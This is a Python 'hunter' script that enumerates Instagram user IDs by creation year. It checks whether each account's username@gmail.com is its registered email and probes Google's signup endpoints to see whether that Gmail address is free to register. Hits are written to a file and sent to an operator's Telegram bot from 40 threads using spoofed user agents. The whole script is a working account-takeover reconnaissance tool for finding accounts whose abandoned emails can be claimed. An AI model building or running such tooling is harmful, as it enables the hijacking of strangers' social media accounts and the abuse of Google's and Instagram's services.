# Developed by 𝐁𝐀𝐑𝐀𝐊𝐀𝐓
# Telegram: @zater_r
import sys
import subprocess
try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2
import os
import time
from bs4 import BeautifulSoup
from rich.table import Table
import os
import signal
import datetime
from datetime import date
try:
  from rich.console import Console
  import requests
  from requests import get
except:
  os.system("pip install requests")
  import requests
  from requests import get
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  import user_agent
  from user_agent import generate_user_agent
try:
    import re
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent

import requests
import time
from user_agent import generate_user_agent
import random
import faker
from faker import Faker
import uuid
from threading import Thread
from hashlib import md5
from random import randrange, choice
import re
import json
import base64
import string
import threading
from typing import Optional
from rich import box

class Colors:
    O = '\x1b[38;5;208m'
    R = '\033[1;31m'
    X = '\033[1;33m'
    F = '\033[2;32m'
    C = "\033[1;97m"
    B = '\033[2;36m'
    K = '\033[2;35m'
    Rn = "\033[0m"

class GoogleTLManager:
    def __init__(self):
        self.tl_file = 'tl.txt'
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'

    def _generate_random_string(self, min_len: int, max_len: int) -> str:
        return ''.join(choice(self.yy) for _ in range(randrange(min_len, max_len)))

    def fetch_new_tl(self) -> Optional[str]:
        try:
            n1 = self._generate_random_string(6, 9)
            n2 = self._generate_random_string(3, 9)
            host = self._generate_random_string(15, 30)

            he3 = {
                "accept": "*/*",
                "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "x-same-domain": "1",
                'user-agent': str(generate_user_agent()),
            }

            session = requests.Session()
            res1 = session.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
            match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if not match:
                return None
            tok = match.group(2)

            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'user-agent': generate_user_agent(),
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }

            response = requests.post(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies,
                headers=headers,
                data=data,
            )
            tl = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']

            try:
                os.remove(self.tl_file)
            except:
                pass
            with open(self.tl_file, 'a') as f:
                f.write(tl + '//' + host + '\n')
            return f'{tl}//{host}'
        except Exception as e:
            return None

class GmailChecker:
    def __init__(self):
        self.tl_manager = GoogleTLManager()

    def check(self, email: str) -> str:
        if '@' in email:
            email = str(email).split('@')[0]
        try:
            try:
                o = open('tl.txt', 'r').read().splitlines()[0]
            except:
                self.tl_manager.fetch_new_tl()
                o = open('tl.txt', 'r').read().splitlines()[0]

            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'user-agent': generate_user_agent(),
            }
            params = {'TL': tl}
            data = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'

            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )

            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                self.tl_manager.fetch_new_tl()
                return self.check(email)
            else:
                return 'bad'
        except:
            return self.check(email)

class InstagramScraper:
    @staticmethod
    def generate_global_ua() -> str:
        devices = [
            {"brand": "samsung", "model": "SM-S918B", "device": "dm3q", "board": "kalama", "cpu": "snapdragon"},
            {"brand": "Google", "model": "Pixel 8 Pro", "device": "husky", "board": "husky", "cpu": "tensor-g3"}
        ]
        device = choice(devices)
        return f"Instagram 311.0.0.32.118 Android (34/14; 480dpi; 1440x3120; {device['brand']}; {device['model']}; {device['device']}; {device['board']}; en_US; 545986931)"

    @staticmethod
    def get_info_fast(username: str, year: str, followers: str, posts: str, jj: str = "gmail.com") -> str:
        return f'''
╔   ─────━ ░ 𝐁𝐀𝐑𝐀𝐊𝐀𝐓 ░ ━─────   ╗
 ⌦ [ 🔥 صيد سريع 🔥 ]
     ✺ Username : @{username}
     ✺ Email : {username}@{jj}
     ✺ Followers : {followers}
     ✺ Posts : {posts}
     ✺ Date Account : {year}
     ✺ URL: https://www.instagram.com/{username}/
 ◢─────━ ░ 𝐁𝐀𝐑𝐀𝐊𝐀𝐓 ░━──────◣
        ❝ By @zater_r ❞
        '''

class AccountValidator:
    def __init__(self, token: str, chat_id: str, year: str):
        self.token = token
        self.chat_id = chat_id
        self.gmail_checker = GmailChecker()
        self.year = year
        self.hits = 0
        self.bads_instagram = 0
        self.bads_email = 0
        self.lock = threading.Lock()
        self.current_email = ""

    def update_stats(self, hits=0, bad_insta=0, bad_email=0):
        with self.lock:
            self.hits += hits
            self.bads_instagram += bad_insta
            self.bads_email += bad_email

    def display_status(self, current_email=""):
        self.current_email = current_email
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""
{Colors.C}+------------------------------------------+
| {Colors.F}[1]{Colors.F} Hits ==> {Colors.F}[ {self.hits} ]
| {Colors.R}[2]{Colors.R} Bad  ==> {Colors.R}[ {self.bads_instagram} ]
| {Colors.X}[3]{Colors.X} Email Not Avail.==> {Colors.X}[ {self.bads_email} ]
| {Colors.X}[4]{Colors.X} Checking ==> {Colors.X}[ {current_email} ]
| {Colors.B}By: @zater_r{Colors.B}
{Colors.C}+------------------------------------------+
""")

    def process_email(self, email: str, followers: str = "0", posts: str = "0", explicit_year=None):
        try:
            username = email.split('@')[0]
            if '_' in username or len(username) < 6:
                self.update_stats(bad_email=1)
                return

            ua = InstagramScraper.generate_global_ua()
            self.display_status(email)

            client = httpx.Client(http2=True, timeout=12)
            response = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={'User-Agent': ua, 'content-type': "application/x-www-form-urlencoded; charset=UTF-8"}
            )
            client.close()

            if 'email_is_taken' in str(response.text):
                if 'good' == self.gmail_checker.check(email):
                    username, jj = email.split('@')
                    self.update_stats(hits=1)

                    target_year = explicit_year if explicit_year else self.year
                    msg = InstagramScraper.get_info_fast(username, target_year, followers, posts, jj)

                    with open('hits1.txt', 'a', encoding='utf-8') as ff:
                        ff.write(f'{msg}\n')

                    try:
                        video_url = "https://t.me/ANIME_editsssss/11128"
                        requests.get(f"https://api.telegram.org/bot{self.token}/sendVideo?chat_id={self.chat_id}&video={video_url}&caption={msg}", timeout=5)
                    except:
                        pass
                else:
                    self.update_stats(bad_email=1)
            else:
                self.update_stats(bad_insta=1)

            time.sleep(0.1)

        except:
            self.update_stats(bad_insta=1)

class UserCollector:
    def __init__(self, validator: AccountValidator, uid_ranges_list: list):
        self.validator = validator
        self.uid_ranges_list = uid_ranges_list
        self.ids_set = set()
        self.found_usernames = set()

    def _rand_id_and_year(self):
        while True:
            u_min, u_max, year = choice(self.uid_ranges_list)
            Id = str(randrange(u_min, u_max))
            if Id not in self.ids_set:
                self.ids_set.add(Id)
                return Id, year

    def start(self, num_threads=40):
        def worker():
            while True:
                try:
                    Id, year = self._rand_id_and_year()
                    lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
                    ua = InstagramScraper.generate_global_ua()

                    headers = {
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://www.instagram.com',
                        'user-agent': ua,
                        'x-fb-lsd': lsd,
                    }

                    data = {
                        'lsd': lsd,
                        'fb_api_caller_class': 'RelayModern',
                        'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                        'variables': f'{{"userID":"{Id}","username":"cristiano"}}',
                        'server_timestamps': 'true',
                        'doc_id': '7717269488336001',
                    }

                    response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data, timeout=12)
                    resp_json = response.json()

                    user_data = resp_json.get('data', {}).get('user', {})
                    if not user_data:
                        continue

                    username = user_data.get('username', '')
                    if not username or username in self.found_usernames:
                        continue

                    # جلب عدد المتابعين والمنشورات مباشرة من استجابة الإنستغرام
                    followers = user_data.get('edge_followed_by', {}).get('count', '0')
                    posts = user_data.get('edge_owner_to_timeline_media', {}).get('count', '0')

                    self.found_usernames.add(username)
                    email = f'{username}@gmail.com'
                    self.validator.process_email(email, followers=str(followers), posts=str(posts), explicit_year=year)

                except:
                    continue

        for _ in range(num_threads):
            Thread(target=worker).start()

def main():
    console = Console()
    os.system('clear' if os.name == 'posix' else 'cls')

    table = Table(show_header=False, box=box.ROUNDED, pad_edge=False)
    table.add_column(justify="center", style="cyan", width=35)
    table.add_row("░ 𝐁𝐀𝐑𝐀𝐊𝐀𝐓 ░")
    table.add_row("Fast Hunter - الصيد السريع")
    table.add_row("Developer : 𝐁𝐀𝐑𝐀𝐊𝐀𝐓")
    console.print(table)

    # طلب التوكن والآيدي يدوياً عند التشغيل
    token = console.input("\n[cyan]Enter Bot Token >> [/cyan]")
    chat_id = console.input("[cyan]Enter Chat ID >> [/cyan]")

    sh = f"""
 {Colors.B}Choose The Year To Hunt :{Colors.Rn}
---------------------------------
{Colors.B}
 1- (2010)       9- (2018)
 2- (2011)      10- (2019)
 3- (2012)      11- (2020)
 4- (2013)      12- (2021)
 5- (2014)      13- (2022)
 6- (2015)      14- (2023)
 7- (2016)      15- (2024)
 8- (2017)      16- (Mixed 2010-2024)
 {Colors.Rn}
---------------------------------
"""
    print(sh)

    ch = console.input("\n[cyan]Option >> [/cyan]")
    while ch not in [str(i) for i in range(1, 17)]:
        console.print("[red]❌ Invalid Choice![/red]")
        ch = console.input("[cyan]Option >> [/cyan]")

    year_map = {
        "1": "2010", "2": "2011", "3": "2012", "4": "2013",
        "5": "2014", "6": "2015", "7": "2016", "8": "2017",
        "9": "2018", "10": "2019", "11": "2020", "12": "2021",
        "13": "2022", "14": "2023", "15": "2024", "16": "Mixed"
    }
    year = year_map[ch]

    all_ranges = [
        (1, 2000000, "2010"),
        (2000001, 20000000, "2011"),
        (210468786, 269736186, "2012"),
        (310438486, 495999999, "2013"),
        (1219010000, 1429010000, "2014"),
        (1700000000, 2400000000, "2015"),
        (3313668786, 3713668786, "2016"),
        (5398785217, 5999785217, "2017"),
        (7497939245, 8597939245, "2018"),
        (11254029834, 21254029834, "2019"),
        (40064475395, 43464475395, "2020"),
        (45064475396, 49999999999, "2021"),
        (50000000000, 56000000000, "2022"),
        (56000000001, 62000000000, "2023"),
        (62000000001, 68000000000, "2024")
    ]

    if ch == "16":
        uid_ranges_list = all_ranges
    else:
        idx = int(ch) - 1
        uid_ranges_list = [all_ranges[idx]]

    os.system('clear')
    GoogleTLManager().fetch_new_tl()
    time.sleep(0.2)
    os.system('clear')
    validator = AccountValidator(token, chat_id, year)

    collector = UserCollector(validator, uid_ranges_list)
    collector.start(num_threads=40)

if __name__ == "__main__":
    main()


